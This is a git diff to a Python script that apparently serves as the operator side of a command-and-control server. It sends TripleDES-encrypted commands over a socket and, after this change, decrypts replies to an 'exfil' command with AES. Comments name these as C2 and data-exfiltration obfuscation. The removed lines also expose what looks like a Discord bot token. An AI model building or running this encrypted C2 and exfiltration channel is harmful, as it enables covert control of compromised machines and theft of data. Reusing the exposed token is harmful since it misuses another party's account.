@@ -4,13 +4,10 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
 import os
 
-SERVER_IP = '127.0.0.1'
+SERVER_IP = '192.168.56.1'
 SERVER_PORT = 8080
 
-# Discord bot stuff:
-# get 1231711923532464240 MTIzMTcwOTU1MzU2NjAyNzg1OA.G3zTy9.DmP9aHL8EIYWLlOOGnTHD13-SPyBy3sziS3g_k
-
-def encrypt_data(key, data):
+def encrypt_tdes(key, data):
     iv = os.urandom(8)
     cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
     encryptor = cipher.encryptor()
@@ -19,13 +16,32 @@ def encrypt_data(key, data):
     encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
     return iv + encrypted_data
 
-def decrypt_data(key, encrypted_data):
+def decrypt_tdes(key, encrypted_data):
     iv = encrypted_data[:8]
     encrypted_data = encrypted_data[8:]
     cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
     decryptor = cipher.decryptor()
     decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
     unpadder = padding.PKCS7(64).unpadder()
+    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
+    return unpadded_data
+
+def encrypt_aes(recipeseed, data):
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(recipeseed), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+    return iv + encrypted_data
+
+def decrypt_aes(recipeseed, encrypted_data):
+    iv = encrypted_data[:16]
+    encrypted_data = encrypted_data[16:]
+    cipher = Cipher(algorithms.AES(recipeseed), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
+    unpadder = padding.PKCS7(128).unpadder()
     unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
     return unpadded_data
 
@@ -50,10 +66,14 @@ while True:
             server_socket.close()
             exit(0)
 
-        conn.sendall(encrypt_data(key, message.encode()))
+        conn.sendall(encrypt_tdes(key, message.encode()))
 
         response = conn.recv(4096)
-        print(decrypt_data(key, response).decode())
+
+        if message.split(' ')[0] == "exfil":
+            print(decrypt_aes(key, response).decode()) # data exfil obfuscation is AES
+        else:
+            print(decrypt_tdes(key, response).decode()) # C2 comms obfuscation is TripleDES
 
         if not response:
             print("Connection to {} closed".format(addr[0]))
